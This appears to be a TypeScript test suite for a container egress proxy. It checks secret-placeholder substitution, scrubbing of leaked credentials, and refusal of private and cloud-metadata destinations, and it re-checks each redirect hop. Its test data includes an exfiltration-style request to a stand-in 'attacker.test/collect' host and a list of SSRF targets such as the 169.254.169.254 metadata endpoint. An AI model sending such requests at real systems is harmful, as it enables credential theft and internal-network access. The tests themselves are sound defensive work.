// Defends: the secret reaches the upstream and nothing the container reads carries it; a method
// missing from the RPC surface is a silent no-op, so reachability is derived from handler source.
import { describe, expect, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import * as v from 'valibot';
import {
  EGRESS_PLACEHOLDER_PREFIX, refusedHostname, type EgressSecretBinding,
} from '@kinu.run/core';
import type { KinuSandbox } from '../src/kinu-sandbox';
// Static: neither module reaches `cloudflare:email`, so neither needs the mock below.
import { kinuEgressParams } from '../src/egress/configure';
import { adaptCloudflareSandbox } from '../src/sandbox-exec-lane';
import type { EgressInjectionResult } from '@kinu.run/core';
import type { OutboundHandlerContext } from '@cloudflare/containers';
import type { ContainerEgressEnv, ContainerEventResolver, KinuEgressParams } from '../src/egress/outbound';
import { mockAgentsSdk } from './helpers/agents-sdk';
import { jsrpcStub } from './helpers/jsrpc-stub';
import {
  createRecordingLogger, setDiagnosticsSink, type RecordedLog,
} from '@kinu.run/core/obs';
import { KINU_USER_AGENT, kinuUserAgent, reoriginateRequest } from '@kinu.run/core';
import { present } from '@kinu.run/test-utils';

// The gate's own resolver, so gate and test read one of the two installed Containers copies.
// `require`: the gate's `.ts` import paths need `allowImportingTsExtensions` (TS5097 otherwise).
const egressGate = v.parse(
  v.object({ boundContainers: v.function() }),
  createRequire(import.meta.url)('../../../scripts/egress-interception'),
);

const BoundContainers = v.object({ module: v.string(), version: v.string() });

// `agents` reaches `cloudflare:email`: mock first, then dynamic imports.
mockAgentsSdk();

const { ORCHESTRATOR_RPC_SURFACE } = await import('../src/rpc-surface');

const {
  CONTAINER_EVENT_HOST,
  handleContainerEgress, handleContainerEvent, parseEgressParams,
} = await import('../src/egress/outbound');

const root = new URL('../', import.meta.url).pathname;

function ctx(params: OutboundHandlerContext['params']): OutboundHandlerContext {
  return { containerId: 'container-1', className: 'KinuSandbox', params };
}

const read = (path: string): string => readFileSync(`${root}${path}`, 'utf8');

const SECRET = ['sk_live_', 'abcdefghij0123456789'].join('');

const PLACEHOLDER = `${EGRESS_PLACEHOLDER_PREFIX}${'Q'.repeat(43)}`;

const BINDING: EgressSecretBinding = {
  id: 'stripe', label: 'Stripe', host: 'api.stripe.com', placeholder: PLACEHOLDER,
};

const PARAMS: KinuEgressParams = {
  workspaceName: 'kinu-main', ownerUserId: 'user-1', bindings: [BINDING],
};

/** `get` returns a `jsrpcStub`: the real binding is a Proxy, and a literal double hid a TypeError here. */
function fakeEnv(resolve: () => EgressInjectionResult): ContainerEgressEnv<string> {
  return {
    UserDO: {
      idFromName: (name: string) => name,
      get: () => jsrpcStub({ resolveEgressInjection: async () => resolve() }),
    },
    CREDENTIAL_ENCRYPTION_KEY: 'a-test-credential-encryption-key-0123456789',
  };
}

interface FetchCapture {
  readonly seen: Request[];
  readonly restore: () => void;
}

function captureFetch(response: () => Response): FetchCapture {
  const seen: Request[] = [];
  const original = globalThis.fetch;

  const stub: typeof globalThis.fetch = Object.assign(
    async (input: Parameters<typeof globalThis.fetch>[0], init?: Parameters<typeof globalThis.fetch>[1]) => {
      const request = input instanceof Request ? input : new Request(String(input), init);
      seen.push(request);

      return response();
    },
    { preconnect: original.preconnect },
  );

  globalThis.fetch = stub;

  return { seen, restore: () => { globalThis.fetch = original; } };
}

/** `KinuSandbox` is a DO class a test cannot construct; implements only what the preflight reaches. */
function execOnlyBox(): KinuSandbox {
  return Object.create({
    resolveReadiness: async () => ({ kind: 'restored' as const }),
    startProcess: async () => ({
      id: 'p1',
      exitCode: 0,
      waitForExit: async () => ({ exitCode: 0 }),
      getStatus: async () => 'exited',
    }),
    getProcessLogs: async () => ({ stdout: 'done', stderr: '' }),
  });
}

describe('the secret reaches the upstream and comes back scrubbed', () => {
  test('the placeholder becomes the secret on the wire to the bound host', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', {
          method: 'POST', headers: { authorization: `Bearer ${PLACEHOLDER}` },
        }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
        PARAMS,
      );

      expect(response.status).toBe(200);
      expect(upstream.seen).toHaveLength(1);
      expect(upstream.seen[0].headers.get('authorization')).toBe(`Bearer ${SECRET}`);
      // Following redirects would replay the injected credential to whatever host the upstream names.
      expect(upstream.seen[0].redirect).toBe('manual');
    } finally { upstream.restore(); }
  });

  test('an echoed secret is scrubbed out of the body, headers and status text', async () => {
    const upstream = captureFetch(() => new Response(
      `invalid api key: ${SECRET}`,
      {
        status: 401,
        statusText: `rejected ${SECRET}`,
        headers: { 'www-authenticate': `Bearer error="${SECRET}"`, location: `/retry?k=${SECRET}` },
      },
    ));

    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
        PARAMS,
      );

      const body = await response.text();
      expect(body).not.toContain(SECRET);
      expect(body).toContain(PLACEHOLDER);
      expect(response.headers.get('www-authenticate')).not.toContain(SECRET);
      expect(response.headers.get('location')).not.toContain(SECRET);
      expect(response.statusText).not.toContain(SECRET);
    } finally { upstream.restore(); }
  });

  test('a refusal names no secret', async () => {
    const response = await handleContainerEgress(
      new Request('https://attacker.test/collect', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
      fakeEnv(() => ({ kind: 'refuse', status: 403, reason: 'bound to api.stripe.com' })),
      PARAMS,
    );

    expect(response.status).toBe(403);
    expect(await response.text()).not.toContain(SECRET);
  });

  test('an unconfigured container is refused, never forwarded', async () => {
    const upstream = captureFetch(() => new Response('should not happen'));

    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/'), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), undefined,
      );

      expect(response.status).toBe(503);
      expect(upstream.seen).toHaveLength(0);
    } finally { upstream.restore(); }
  });

  test('traffic with no placeholder is forwarded untouched', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      await handleContainerEgress(
        new Request('https://example.com/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
        PARAMS,
      );
      expect(upstream.seen[0].url).toBe('https://example.com/');
      expect(upstream.seen[0].headers.get('authorization')).toBeNull();
    } finally { upstream.restore(); }
  });
});

describe('what the container is configured with', () => {
  test('only GRANTED bindings are passed, so an ungranted placeholder is never learned', () => {
    const params = kinuEgressParams({
      workspaceName: 'kinu-main',
      ownerUserId: 'user-1',
      vault: [BINDING, { id: 'prod-db', label: 'Prod DB', host: 'db.internal', placeholder: `${EGRESS_PLACEHOLDER_PREFIX}${'Z'.repeat(43)}` }],
      grants: [{ rule: 'egress-secret:stripe', executor: 'sandbox' }],
    });

    expect(params.bindings.map((b) => b.id)).toEqual(['stripe']);
    expect(JSON.stringify(params)).not.toContain('prod-db');
  });

  test('a grant on another executor does not widen the container', () => {
    const params = kinuEgressParams({
      workspaceName: 'w', ownerUserId: 'u', vault: [BINDING],
      grants: [{ rule: 'egress-secret:stripe', executor: 'device' }],
    });

    expect(params.bindings).toEqual([]);
  });

  test('the event host is bound BEFORE the catch-all, by the object that owns the container',
    () => {
      // Catch-all first leaves a window where a container event is forwarded to an unresolvable
      // `.internal` name. Read from the one writer's source.
      const sandbox = read('src/kinu-sandbox.ts');
      const body = sandbox.slice(sandbox.indexOf('async configureEgress('));
      expect(body.indexOf('setOutboundByHost')).toBeLessThan(body.indexOf('setOutboundHandler'));
      expect(body.indexOf('WORKSPACE_NAME_KEY')).toBeLessThan(body.indexOf('setOutboundByHost'));
    });

  test('params are parsed, so a malformed configuration reads as unconfigured', () => {
    expect(parseEgressParams(ctx(PARAMS))).toEqual(PARAMS);
    expect(parseEgressParams(ctx({ workspaceName: 'w' }))).toBeUndefined();
    expect(parseEgressParams(ctx(undefined))).toBeUndefined();
  });
});

describe('configuration is awaited before the container runs', () => {
  test('the first operation configures once, and concurrent callers share it', async () => {
    let configured = 0;
    let released: () => void = () => {};

    const gate = new Promise<void>((resolve) => { released = resolve; });

    // `null`: an exec-only box publishes no previews (see `adaptCloudflareSandbox`'s exposePort).
    const handle = adaptCloudflareSandbox(
      execOnlyBox(),
      async () => { configured += 1; await gate; },
      null,
    );

    const both = Promise.all([handle.exec('a'), handle.exec('b')]);
    released();
    expect((await both).map((r) => r.stdout)).toEqual(['done', 'done']);
    expect(configured).toBe(1);
  });

  test('a failed configuration is not cached, so the next call retries', async () => {
    let attempts = 0;

    const handle = adaptCloudflareSandbox(
      execOnlyBox(),
      async () => {
        attempts += 1;

        if (attempts === 1) throw new Error('root unreachable');
      },
      null,
    );

    await expect(handle.exec('a')).rejects.toThrow('root unreachable');
    expect((await handle.exec('a')).stdout).toBe('done');
    expect(attempts).toBe(2);
  });

  test('EVERY operation that can start the container waits for it — including the file lanes',
    async () => {
      // A cold file op must not start the container itself and read a blank disk.
      const order: string[] = [];

      const box: KinuSandbox = Object.create({
        resolveReadiness: async () => {
          order.push('resolveReadiness');

          return { kind: 'restored' as const };
        },
        readFile: async () => {
          order.push('readFile');

          return { content: '' };
        },
        writeFile: async () => {
          order.push('writeFile');

          return undefined;
        },
        listFiles: async () => {
          order.push('listFiles');

          return { files: [] };
        },
        deleteFile: async () => {
          order.push('deleteFile');

          return undefined;
        },
      });

      const handle = adaptCloudflareSandbox(box, async () => { order.push('configureEgress'); }, null);

      await handle.readFile('/workspace/a');
      await handle.writeFile('/workspace/a', 'x');
      await handle.listFiles('/workspace');
      await handle.deleteFile('/workspace/a');

      expect(order).toEqual([
        'configureEgress', 'resolveReadiness', 'readFile',
        'resolveReadiness', 'writeFile',
        'resolveReadiness', 'listFiles',
        'resolveReadiness', 'deleteFile',
      ]);
    });
});

describe('reachability of the container event channel', () => {
  // Derived from handler source so a new call without allowlisting fails.
  test('every OrchestratorAgent method the egress layer calls is on the RPC surface', () => {
    const handler = read('src/egress/outbound.ts');
    const called = [...handler.matchAll(/\bagent\.(\w+)\(/g)].map(([, name]) => name);
    expect(called.length).toBeGreaterThan(0);
    expect([...new Set(called)].filter((name) => !ORCHESTRATOR_RPC_SURFACE.includes(name))).toEqual([]);
  });

  test('the method the channel calls actually exists on the orchestrator', async () => {
    // Dynamic: orchestrator reaches cloudflare:email, so load after the SDK mock.
    const { OrchestratorAgent } = await import('../src/orchestrator');
    const handler = Object.getOwnPropertyDescriptor(OrchestratorAgent.prototype, 'acceptContainerEvent');

    expect(handler?.value).toBeInstanceOf(Function);
  });

  test('the event channel lives on a name that resolves nowhere public', () => {
    expect(CONTAINER_EVENT_HOST.endsWith('.internal')).toBe(true);
  });
});

describe('the posture the whole design rests on', () => {
  test('ContainerProxy is exported from the Worker entry', () => {
    // Without it `applyOutboundInterception` throws and nothing is intercepted.
    expect(read('src/server.ts')).toMatch(/export\s*\{[^}]*\bContainerProxy\b[^}]*\}/);
  });

  test('the container class denies non-HTTP egress and intercepts HTTPS', () => {
    const source = read('src/kinu-sandbox.ts');
    expect(source).toContain('enableInternet = false');
    // The SDK does not default this on, whatever its docs say.
    expect(source).toContain('interceptHttps = true');
  });

  test('the SDK still leaves HTTPS interception off by default', () => {
    // Re-measured on the copy the artifact binds, so the comments asserting it cannot rot.
    const shipped = v.parse(BoundContainers, egressGate.boundContainers());
    expect(readFileSync(shipped.module, 'utf8')).toContain('interceptHttps = false');
  });
});

// A JSRPC stub is a Proxy: `Object.assign`/spread copy nothing off it. The lint
// `anti-slop/no-copy-rpc-stub` detects copies; this pins that the double behaves like a stub.
describe('a stub is used, never copied', () => {
  test('the double is faithful in the way that matters: copying it loses everything', () => {
    // If a runtime made spreading a stub work, the doubles above stop being evidence.
    const stub = jsrpcStub({ method: () => 'value' });
    expect(Object.keys({ ...stub })).toEqual([]);
    expect(stub.method()).toBe('value');
  });
});

async function recordDiagnostics(body: () => Promise<void>): Promise<readonly RecordedLog[]> {
  const logger = createRecordingLogger();
  const restore = setDiagnosticsSink(logger);

  try { await body(); } finally { restore(); }

  return logger.emitted;
}

/** The vault call throws, as a DO under load or mid-eviction answers a cross-object RPC. */
function throwingVaultEnv(thrown: { cause: unknown }): ContainerEgressEnv<string> {
  return {
    UserDO: {
      idFromName: (name: string) => name,
      get: () => jsrpcStub({ resolveEgressInjection: async () => { throw thrown.cause; } }),
    },
    CREDENTIAL_ENCRYPTION_KEY: 'a-test-credential-encryption-key-0123456789',
  };
}

function throwingEventResolver(thrown: { cause: unknown }): ContainerEventResolver {
  return async () => jsrpcStub({ acceptContainerEvent: async () => { throw thrown.cause; } });
}

// KINU-055. Every request leaving a container says Kinu, first.
describe('one User-Agent for everything a container sends', () => {
  test('traffic with no placeholder carries the Kinu identity', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      await handleContainerEgress(
        new Request('https://example.com/', { headers: { 'user-agent': 'curl/8.5.0' } }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
        PARAMS,
      );
      expect(upstream.seen[0].headers.get('user-agent')).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
    } finally { upstream.restore(); }
  });

  test('the secret-bearing path carries the same identity — one policy, not two', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', {
          method: 'POST', headers: { authorization: `Bearer ${PLACEHOLDER}`, 'user-agent': 'curl/8.5.0' },
        }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
        PARAMS,
      );
      expect(upstream.seen[0].headers.get('user-agent')).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
    } finally { upstream.restore(); }
  });

  test('a container that sends no User-Agent still identifies as Kinu', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      await handleContainerEgress(
        new Request('https://example.com/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
        PARAMS,
      );
      expect(upstream.seen[0].headers.get('user-agent')).toBe(KINU_USER_AGENT);
    } finally { upstream.restore(); }
  });

  test('the caller keeps its own tokens, behind ours, and cannot displace them', () => {
    expect(kinuUserAgent('python-requests/2.32')).toBe(`${KINU_USER_AGENT} python-requests/2.32`);
    expect(kinuUserAgent(null)).toBe(KINU_USER_AGENT);
    expect(kinuUserAgent('   ')).toBe(KINU_USER_AGENT);
    // A field value with a control character is not one. Dropped whole rather
    // than repaired: a repaired identity is a different identity.
    expect(kinuUserAgent('evil\u0000agent')).toBe(KINU_USER_AGENT);
    // A second interception hop must not stack the token again.
    expect(kinuUserAgent(`${KINU_USER_AGENT} curl/8.5.0`)).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
  });
});

// KINU-017: the handler hands the runtime the body it was given, which framing derives from
// (wire measured in `tests/workerd/egress-framing.test.ts`).
describe('the forwarded body is the container\'s own, not a copy of it', () => {
  test('the request that leaves carries the inbound body object itself', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      // `duplex` is required by fetch for a stream body but absent from the Workers `RequestInit` type.
      const init: RequestInit & { duplex: 'half' } = {
        method: 'POST',
        body: new ReadableStream<Uint8Array>({
          start(controller) { controller.enqueue(new Uint8Array([1, 2, 3])); controller.close(); },
        }),
        duplex: 'half',
      };

      const inbound = new Request('https://example.com/upload', init);
      const body = inbound.body;
      await handleContainerEgress(
        inbound, fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
      );
      expect(upstream.seen[0].body).toBe(body);
    } finally { upstream.restore(); }
  });

  test('a bodyless request re-originates without one', () => {
    const rebuilt = reoriginateRequest(
      new Request('https://example.com/thing'),
      'https://example.com/thing',
      { headers: new Headers(), redirect: 'follow' },
    );

    expect(rebuilt.body).toBeNull();
  });
});

// KINU-037. A throwing outbound handler returns no HTTP response ("Empty reply from server").
describe('a throw at the boundary becomes a classified answer', () => {
  test('an unreachable vault answers 503 and names the class, not the request', async () => {
    let response: Response | undefined;

    const emitted = await recordDiagnostics(async () => {
      response = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
        throwingVaultEnv({ cause: new Error('durable object reset') }),
        PARAMS,
      );
    });

    expect(response?.status).toBe(503);
    const body = await present(response, 'the egress response').text();
    expect(body).toContain('unavailable');
    expect(body).toContain('api.stripe.com');

    expect(emitted).toHaveLength(1);
    expect(emitted[0].event).toBe('egress.authority_unreachable');
    expect(emitted[0].code).toBe('unavailable');
    expect(emitted[0].cause).toContain('asking the owner vault');
    expect(emitted[0].cause).toContain('durable object reset');
  });

  test('a deadline on the vault is 504, not 503 — the two imply different retries', async () => {
    const timeout = new DOMException('The operation timed out', 'TimeoutError');

    const response = await handleContainerEgress(
      new Request('https://api.stripe.com/'), throwingVaultEnv({ cause: timeout }), PARAMS,
    );

    expect(response.status).toBe(504);
  });

  test('an upstream that cannot be reached answers 502 with the failure class', async () => {
    const upstream = captureFetch(() => { throw new Error('connection refused'); });
    let response: Response | undefined;

    try {
      const emitted = await recordDiagnostics(async () => {
        response = await handleContainerEgress(
          new Request('https://example.com/'),
          fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
          PARAMS,
        );
      });

      expect(response?.status).toBe(502);
      expect(await present(response, 'the egress response').text()).toContain('example.com');
      expect(emitted).toHaveLength(1);
      expect(emitted[0].event).toBe('egress.upstream_failed');
      expect(emitted[0].cause).toContain('connection refused');
    } finally { upstream.restore(); }
  });

  test('an upstream failure quoting the substituted URL never records the secret', async () => {
    // workerd's fetch failure quotes the revealed URL; wrapping it would log the credential.
    const upstream = captureFetch(() => {
      throw new Error(`Fetch API cannot load: https://api.stripe.com/v1/charges?key=${SECRET}`);
    });

    let response: Response | undefined;

    try {
      const emitted = await recordDiagnostics(async () => {
        response = await handleContainerEgress(
          new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
          fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
          PARAMS,
        );
      });

      expect(response?.status).toBe(502);
      expect(await present(response, 'the egress response').text()).not.toContain(SECRET);
      expect(emitted[0].cause).not.toContain(SECRET);
      // Scrubbed, not deleted: operators correlate on the placeholder.
      expect(emitted[0].cause).toContain(PLACEHOLDER);
    } finally { upstream.restore(); }
  });

  test('the event channel answers when its workspace object refuses the RPC', async () => {
    let response: Response | undefined;

    const emitted = await recordDiagnostics(async () => {
      response = await handleContainerEvent(
        new Request(`https://${CONTAINER_EVENT_HOST}/v1/events`, {
          method: 'POST', body: JSON.stringify({ kind: 'note' }),
        }),
        throwingEventResolver({ cause: new Error('object evicted mid-write') }),
        PARAMS,
      );
    });

    expect(response?.status).toBe(503);
    // The container must know the event is not recorded, or it drops it.
    expect(await present(response, 'the egress response').text()).toContain('send it again');
    expect(emitted[0].event).toBe('egress.event_channel_unreachable');
    expect(emitted[0].cause).toContain('object evicted mid-write');
  });
});

// KINU-086 enforcement (judgment lives in core's `safety/egress-destination.ts`): refuse
// before the vault call, and hand back every redirect hop so it is re-judged.
describe('private destinations are refused at the one place requests leave', () => {
  test.each([
    ['RFC1918 10/8', 'http://10.0.0.5/'],
    ['RFC1918 172.16/12', 'http://172.16.0.1/'],
    ['RFC1918 192.168/16', 'http://192.168.1.1/'],
    ['loopback 127/8', 'http://127.0.0.1/'],
    ['CGNAT 100.64/10', 'http://100.64.0.1/'],
    ['this-network 0.0.0.0/8', 'http://0.0.0.0/'],
    ['metadata address', 'http://169.254.169.254/latest/meta-data/'],
    ['link-local 169.254/16', 'http://169.254.0.1/'],
    ['reserved name localhost', 'http://localhost:8080/'],
    ['reserved domain .localhost', 'http://api.service.localhost/'],
    ['reserved metadata names', 'http://metadata.google.internal/computeMetadata/v1/'],
    ['IPv6 loopback', 'http://[::1]/'],
    ['IPv6 link-local', 'http://[fe80::1]/'],
    ['IPv6 ULA', 'http://[fd00::119:1]/'],
    ['IPv6 mapped private', 'http://[::ffff:169.254.169.254]/'],
  ])('%s is refused before the vault is asked', async (_label, target) => {
    const upstream = captureFetch(() => new Response('should not happen'));

    try {
      const refusal = await handleContainerEgress(
        new Request(target), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
      );

      expect(refusal.status).toBe(403);
      expect(await refusal.json()).toMatchObject({ reason: 'denied' });
      expect(upstream.seen).toHaveLength(0);
    } finally { upstream.restore(); }
  });

  test('the refusal is recorded with the classification and host only', async () => {
    const emitted = await recordDiagnostics(async () => {
      await handleContainerEgress(
        new Request('http://169.254.169.254/latest/meta-data/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
      );
    });

    expect(emitted[0].event).toBe('egress.private_destination');
    expect(emitted[0].code).toBe('denied');
    // Host only; one shape across the shared classifier's seams (see unit-codemode-egress.test.ts).
    expect(emitted[0].fields).toEqual({ host: '169.254.169.254', seam: 'container' });
  });

  test('the public control still succeeds end to end', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      const response = await handleContainerEgress(
        new Request('https://example.com/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
      );

      expect(response.status).toBe(200);
      expect(upstream.seen).toHaveLength(1);
    } finally { upstream.restore(); }
  });

  test('the classifier shares one judgment with core, at the CF boundary', () => {
    expect(refusedHostname('[fe80::1]')).toMatchObject({ reason: 'denied' });
    expect(refusedHostname('2606:4700:4700::1111')).toBeNull();
  });
});

describe('every redirect hop is judged, not trusted', () => {
  test('the runtime never follows: the 3xx is handed back for re-judgment', async () => {
    const hop = captureFetch(() => new Response(null, {
      status: 302, headers: { location: 'http://169.254.169.254/latest/meta-data/' },
    }));

    try {
      const first = await handleContainerEgress(
        new Request('https://public.example/start'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
      );

      expect(first.status).toBe(302);
      // Manual redirect: the hop's next request is the container's and re-enters the handler.
      expect(hop.seen[0].redirect).toBe('manual');
    } finally { hop.restore(); }
  });

  test('the redirected request re-enters the handler and is refused at the hop', async () => {
    const refused = captureFetch(() => new Response('should not happen'));

    try {
      const second = await handleContainerEgress(
        new Request('http://169.254.169.254/latest/meta-data/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
      );

      expect(second.status).toBe(403);
      expect(await second.json()).toMatchObject({ reason: 'denied' });
      expect(refused.seen).toHaveLength(0);
    } finally { refused.restore(); }
  });
});
